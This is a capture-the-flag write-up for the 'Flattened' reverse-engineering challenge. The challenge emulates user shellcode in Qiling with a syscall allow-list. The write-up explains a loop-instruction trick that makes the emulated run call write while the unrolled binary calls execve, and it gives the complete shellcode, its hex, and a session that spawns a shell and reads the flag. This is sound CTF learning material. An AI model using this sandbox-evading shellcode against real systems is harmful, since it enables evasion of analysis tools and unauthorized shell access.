# Flattened

rev medium, 18 solves, 471 points

### First Looks

Downloading the challenge and taking a look at `chall.py`,
we can see that the user's hex input is interpreted as x86-64 assembly amd executed by the Qiling binary emulation framework.
Each executed instruction is added to a list, then joined in a binary at the end which is run.
This is the idea of `flattening`, loops are essentially unrolled into sequential instructions.
This is why all `loop` instructions are not added to the final list.

### The Problem

However, there is a catch, syscalls not in {0x1, 0x3c} = {SYS_write, SYS_exit} are flagged as illegal and causes the entire program to terminate.
So we cannot simply call `execve` or something similar to get a reverse shell.

```python
allowed_syscalls = {1, 0x3c}
if (
        capstone.x86_const.X86_GRP_INT in i.groups
        and ql.reg.eax not in allowed_syscalls
):
    print(f"[-] syscall = {hex(ql.reg.eax)}")
    raise ValueError("HACKING DETECTED!")
```

### Formulating a Plan
We need to write a assembly program such that the execution is different when unrolled. Our goal is to then have Qiling execute `write(STDOUT, NULL, 0)` (syscall 0x1) and after unrolling `execve('/usr/bin/sh', NULL, NULL)` (syscall 0x0b). Notice that on [x86-64](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit) the `syscall` convention is is `rax(rdi, rsi, rdx, r10, r8, r9)`. So somehow if we can alter those registers in the unrolled version we are golden.

### Executing the Plan
I searched for all x86-64 instructions that branched on Google and found the "beauty" that is `loop <label>`. If `rcx` > 0 then it decrements `rcx` and jumps to the specified label. The key is that it has a side effect: `rcx` is modified. Since the unrolled version won't include this instruction, `rcx` will never be decremented. So we can use this to our advantage with the following snippet:

```
mov     rcx,1
l1:
loop    l1
```

Qiling: `rcx` = 0

Unrolled: `rcx` = 1 (only `mov` is executed, `loop` is a branching instruction so it was not included in unrolled assembly)

Now that we have this building block, what about altering `rax`, `rcx`, and `rdi`, thus changing the syscall? We can use `imul` with `ecx` to our advantage. For example consider:
```
mov     rax,58
imul    rax,rcx
syscall
inc     rax
```
There are no branching instructions but convince yourself that `rax` will be 59 on the unrolled executable and 1 on the Qiling executable.

### Final Assembly (shellcode)

```
xor     r15,r15                 ; xor reg,reg is the same as zeroing that reg
push    r15
push    r15
mov     r15,0x68732f
push    r15
mov     r15,0x6e69622f7273752f  
push    r15                     ; Put `/usr/bin/sh` on stack 8 bytes (characters) at a time

mov     rcx,1
l1:
loop    l1                      ; rcx = qiling ? 0 : 1

mov     rax,58
imul    rax,rcx                 ; rax = qiling ? 0 (write sycall number - 1) : 58 (execve syscall number - 1)
inc     rax                     ; syscall = qiling ? 1 (write) : 59 (execve)

mov     rdi,rsp
dec     rdi
imul    rdi,rcx
inc     rdi                     ; rdi = syscall arg0 = qiling ? 1 (STDOUT) : rsp (pointer to '/usr/bin/sh')

xor     rsi,rsi                 ; zero out arg1
xor     rdx,rdx                 ; zero out arg2
syscall                         ; qiling ? write(STDOUT, NULL, 0) : execve('/usr/bin/sh', NULL, NULL)

mov     rax,0x3c
xor     rdi,rdi
syscall                         ; exit(0)
```
### Final Input

We can use `pwntools` to assemble:

```python
from pwn import *

context.arch = "amd64"

print(asm(open('shellcode.S').read()).hex())
```

Which gives us: `4d31ff4157415749c7c72f736800415749bf2f7573722f62696e415748c7c101000000e2fe48c7c03a000000480fafc148ffc04889e748ffcf480faff948ffc74831f64831d20f0548c7c03c0000004831ff0f05`

### Flag

```
❯ nc pwn.chall.pwnoh.io 13377


Enter code in hex:
4d31ff4157415749c7c72f736800415749bf2f7573722f62696e415748c7c101000000e2fe48c7c03a000000480fafc148ffc04889e748ffcf480faff948ffc74831f64831d20f0548c7c03c0000004831ff0f05
[+] 0x11ff000: xor r15, r15
[+] 0x11ff003: push r15
[+] 0x11ff005: push r15
[+] 0x11ff007: mov r15, 0x68732f
[+] 0x11ff00e: push r15
[+] 0x11ff010: movabs r15, 0x6e69622f7273752f
[+] 0x11ff01a: push r15
[+] 0x11ff01c: mov rcx, 1
[ ] 0x11ff023: loop 0x11ff023
[+] 0x11ff025: mov rax, 0x3a
[+] 0x11ff02c: imul rax, rcx
[+] 0x11ff030: inc rax
[+] 0x11ff033: mov rdi, rsp
[+] 0x11ff036: dec rdi
[+] 0x11ff039: imul rdi, rcx
[+] 0x11ff03d: inc rdi
[+] 0x11ff040: xor rsi, rsi
[+] 0x11ff043: xor rdx, rdx
[+] 0x11ff046: syscall
[=]     write(fd = 0x1, buf = 0x0, count = 0x0) = 0x0
[+] 0x11ff048: mov rax, 0x3c
[+] 0x11ff04f: xor rdi, rdi
[+] 0x11ff052: syscall
[=]     exit(code = 0x0)
[+] Your program has been flattened! Executing ...
ls
chall.py
flag.txt
cat flag.txt
buckeye{execve_plu5_0n3_1s_exit}
```

Notice how the `loop` instruction is not included, and how `write` changes to our `execve` shell